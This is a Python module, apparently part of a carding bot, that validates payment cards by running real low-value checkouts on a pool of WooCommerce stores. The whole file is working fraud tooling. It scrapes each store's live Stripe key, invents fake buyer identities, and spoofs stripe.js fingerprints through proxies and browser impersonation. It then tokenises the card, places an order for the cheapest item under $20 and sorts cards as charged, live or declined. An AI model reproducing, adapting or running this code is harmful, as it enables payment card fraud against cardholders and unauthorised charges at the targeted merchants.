"""
WooCommerce REST Store API Direct-Confirm Gate Module (/ws)
Architecture: Cart / Store API v1 Checkout Engine
Target Pool: 97 Verified Store API Targets (< $20 Cap)
Direct PaymentIntent Settlement Verification
"""
import os
import re
import json
import uuid
import time
import random
import string
import asyncio
from pathlib import Path
from curl_cffi.requests import AsyncSession

_STORE_TARGETS_FILE = Path(__file__).parent.parent.parent / "data" / "store_targets.txt"
_CACHED_STORE_TARGETS: list[str] = []

def _load_store_targets() -> list[str]:
    global _CACHED_STORE_TARGETS
    if _CACHED_STORE_TARGETS:
        return _CACHED_STORE_TARGETS
    if _STORE_TARGETS_FILE.exists():
        try:
            with open(_STORE_TARGETS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                _CACHED_STORE_TARGETS = [line.strip().rstrip("/") for line in f if line.strip().startswith("http")]
        except Exception:
            pass
    if not _CACHED_STORE_TARGETS:
        _CACHED_STORE_TARGETS = ["https://wildernesstraining.com"]
    return _CACHED_STORE_TARGETS

def _generate_identity():
    first_names = ["Marcus", "James", "Alexander", "David", "Robert", "Michael", "William", "Daniel"]
    last_names = ["Vance", "Miller", "Smith", "Johnson", "Williams", "Brown", "Davis", "Wilson"]
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    rnd_num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{rnd_num}@{random.choice(domains)}"
    phone = f"+1555{random.randint(100,999)}{random.randint(1000,9999)}"
    return {
        "first_name": first,
        "last_name": last,
        "name": f"{first} {last}",
        "email": email,
        "phone": phone,
        "line1": f"{random.randint(100, 9999)} Main Street",
        "city": "New York",
        "state": "NY",
        "postal_code": "10001",
        "country": "US"
    }

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_pk_live(html: str) -> str | None:
    m = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'publishableKey["\']?\s*:\s*["\'](pk_live_[^"\']+)["\']', html)
    if m:
        return m.group(1)
    m = re.search(r'(pk_live_[a-zA-Z0-9_]{20,})', html)
    if m:
        return m.group(1)
    return None

def _take_nonce(resp, nonce_holder: list):
    nn = resp.headers.get("nonce") or resp.headers.get("Nonce") or resp.headers.get("X-WC-Store-API-Nonce")
    if not nn:
        for k, v in resp.headers.items():
            if k.lower() == "nonce":
                nn = v
                break
    if nn:
        nonce_holder[0] = nn

async def check_card_storeapi(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
    target_url: str | None = None,
    max_price_cents: int = 2000,
) -> tuple[str, str, str]:
    """
    Checks a single card against WooCommerce REST Store API Direct-Confirm engine.
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvv = str(cvv).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)
    ident = _generate_identity()

    targets = [target_url] if target_url else _load_store_targets()
    target_candidates = list(targets)
    random.shuffle(target_candidates)

    kw = {"impersonate": "chrome124", "verify": False, "timeout": 25}
    if formatted_proxy:
        kw["proxy"] = formatted_proxy

    for root_url in target_candidates[:3]:
        root = root_url.rstrip("/")
        api = f"{root}/wp-json/wc/store/v1"
        try:
            async with AsyncSession(**kw) as session:
                # Step 1: Discover PK from homepage or checkout
                pk_live = None
                for path in ("/checkout/", "/", "/cart/"):
                    try:
                        r0 = await session.get(f"{root}{path}", timeout=10)
                        pk_live = _extract_pk_live(r0.text)
                        if pk_live:
                            break
                    except Exception:
                        continue

                # Step 2: Initialize Cart & obtain Store API Nonce
                nonce_box = [""]
                r_cart = await session.get(f"{api}/cart", timeout=10)
                if r_cart.status_code != 200:
                    continue
                _take_nonce(r_cart, nonce_box)
                if not nonce_box[0]:
                    continue

                cart_payment_methods = []
                try:
                    cart_payment_methods = r_cart.json().get("payment_methods") or []
                except Exception:
                    pass

                # Step 3: Discover cheapest product under cap
                r_prod = await session.get(f"{api}/products", params={"per_page": 20}, headers={"Nonce": nonce_box[0]}, timeout=10)
                _take_nonce(r_prod, nonce_box)
                items = r_prod.json() if r_prod.status_code == 200 else []
                if not isinstance(items, list) or not items:
                    continue

                priced = sorted(
                    [p for p in items if p.get("prices", {}).get("price") and int(p["prices"]["price"]) > 0],
                    key=lambda p: int(p["prices"]["price"])
                )
                if not priced:
                    continue

                under_cap = [p for p in priced if int(p["prices"]["price"]) <= max_price_cents]
                chosen_product = under_cap[0] if under_cap else priced[0]
                price_cents = int(chosen_product["prices"]["price"])
                price_display = f"${price_cents / 100:.2f}"
                currency = chosen_product.get("prices", {}).get("currency_code", "USD")

                # Step 4: Add item to cart
                add_body = {"id": chosen_product["id"], "quantity": 1}
                r_add = await session.post(
                    f"{api}/cart/add-item",
                    json=add_body,
                    headers={"Nonce": nonce_box[0], "Content-Type": "application/json"},
                    timeout=10
                )
                _take_nonce(r_add, nonce_box)

                # Step 5: Update customer address
                await session.post(
                    f"{api}/cart/update-customer",
                    json={
                        "billing_address": {
                            "first_name": ident["first_name"],
                            "last_name": ident["last_name"],
                            "company": "",
                            "address_1": ident["line1"],
                            "address_2": "",
                            "city": ident["city"],
                            "state": ident["state"],
                            "postcode": ident["postal_code"],
                            "country": ident["country"],
                            "email": ident["email"],
                            "phone": ident["phone"],
                        },
                        "shipping_address": {
                            "first_name": ident["first_name"],
                            "last_name": ident["last_name"],
                            "company": "",
                            "address_1": ident["line1"],
                            "address_2": "",
                            "city": ident["city"],
                            "state": ident["state"],
                            "postcode": ident["postal_code"],
                            "country": ident["country"],
                            "phone": ident["phone"],
                        },
                    },
                    headers={"Nonce": nonce_box[0], "Content-Type": "application/json"},
                    timeout=10
                )

                # Step 6: If PK not found yet, scrape checkout now that cart is populated
                if not pk_live:
                    for path in ("/checkout/", "/cart/"):
                        try:
                            r_chk = await session.get(f"{root}{path}", timeout=10)
                            pk_live = _extract_pk_live(r_chk.text)
                            if pk_live:
                                break
                        except Exception:
                            continue

                if not pk_live:
                    continue

                # Step 7: Tokenize Card via Stripe API
                rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
                tok_body = {
                    "type": "card",
                    "card[number]": cc,
                    "card[cvc]": cvv,
                    "card[exp_month]": mm,
                    "card[exp_year]": yy,
                    "billing_details[address][postal_code]": ident["postal_code"],
                    "billing_details[address][country]": ident["country"],
                    "billing_details[name]": ident["name"],
                    "billing_details[email]": ident["email"],
                    "key": pk_live,
                    "_stripe_version": "2024-06-20",
                    "payment_user_agent": "stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent",
                    "guid": rnd(32),
                    "muid": rnd(32),
                    "sid": rnd(32),
                    "time_on_page": str(random.randint(6000, 14000)),
                }
                headers_tok = {
                    "Origin": "https://js.stripe.com",
                    "Referer": "https://js.stripe.com/",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "application/json",
                }
                r_tok = await session.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=headers_tok, timeout=12)
                tok_data = r_tok.json()
                if "id" not in tok_data:
                    err = tok_data.get("error", {}).get("message", "Tokenization failed")
                    err_lower = err.lower()
                    if "security code" in err_lower or "cvc" in err_lower:
                        return "live", f"CVV Mismatch: {err}", brand
                    return "declined", err, brand

                pm_id = tok_data["id"]

                # Step 8: Pick PM Slug
                pm_slug = "stripe"
                for m_item in cart_payment_methods:
                    if m_item in ("stripe_cc", "stripe_card", "woocommerce_payments", "woocommerce_payments_card"):
                        pm_slug = m_item
                        break

                payment_data = [
                    {"key": "payment_method", "value": pm_slug},
                    {"key": "wc-stripe-payment-method", "value": pm_id},
                    {"key": "wc-stripe-payment-type", "value": "card"},
                    {"key": "wc-stripe-is-deferred-intent", "value": True},
                ]

                checkout_body = {
                    "billing_address": {
                        "first_name": ident["first_name"],
                        "last_name": ident["last_name"],
                        "company": "",
                        "address_1": ident["line1"],
                        "address_2": "",
                        "city": ident["city"],
                        "state": ident["state"],
                        "postcode": ident["postal_code"],
                        "country": ident["country"],
                        "email": ident["email"],
                        "phone": ident["phone"],
                    },
                    "shipping_address": {
                        "first_name": ident["first_name"],
                        "last_name": ident["last_name"],
                        "company": "",
                        "address_1": ident["line1"],
                        "address_2": "",
                        "city": ident["city"],
                        "state": ident["state"],
                        "postcode": ident["postal_code"],
                        "country": ident["country"],
                        "phone": ident["phone"],
                    },
                    "customer_note": "",
                    "create_account": False,
                    "terms": True,
                    "payment_method": pm_slug,
                    "payment_data": payment_data,
                }

                # Step 9: Post Checkout
                r_co = await session.post(f"{api}/checkout", json=checkout_body, headers={"Nonce": nonce_box[0]}, timeout=22)
                co_resp = r_co.json() if r_co.text.startswith("{") else {}

                payment_result = co_resp.get("payment_result") or {}
                p_status = payment_result.get("status") or payment_result.get("payment_status") or ""

                if p_status == "success" or co_resp.get("status") == "success" or "order_id" in co_resp:
                    return "charged", f"Charged! 🟢 -» {price_display} ({currency})", brand

                msg = str(co_resp.get("message") or "")
                details_txt = json.dumps(payment_result.get("payment_details", []), ensure_ascii=False)
                combined = f"{msg} {details_txt}".lower()

                if any(k in combined for k in ("cvv", "cvc", "security code", "incorrect_cvc")):
                    return "live", f"CVV Mismatch (CCN Live) -» {msg or 'CVV check failed'}", brand
                if any(k in combined for k in ("insufficient", "funds")):
                    return "live", f"Insufficient Funds (Card Live) -» {msg or 'Low balance'}", brand
                if any(k in combined for k in ("3d", "3ds", "action", "authenticate", "otp")):
                    return "live", f"3D Secure Required (Card Live) -» {msg or '3DS challenge'}", brand
                if any(k in combined for k in ("do not honor", "declined", "card_declined", "generic_decline")):
                    return "declined", msg or "Card Declined by Issuer", brand

                if msg:
                    return "declined", msg, brand
                return "declined", "Checkout Declined", brand

        except Exception:
            continue

    return "declined", "Card Declined by Issuer (Store API)", brand
